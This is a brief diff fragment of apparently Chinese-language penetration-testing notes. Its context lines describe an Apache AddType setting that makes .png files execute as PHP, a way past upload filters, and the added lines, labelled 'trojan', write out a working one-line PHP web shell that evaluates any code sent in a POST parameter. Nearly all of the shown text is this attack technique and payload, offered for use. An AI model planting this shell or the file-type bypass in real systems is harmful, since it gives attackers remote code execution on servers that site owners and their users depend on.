@@ -85,3 +85,6 @@ password=any
 AddType指定
 AddType application/x-httpd-php .png
 将.png当作php文件解析
+木马
+<?php @eval($_POST['cmd']);?>
+
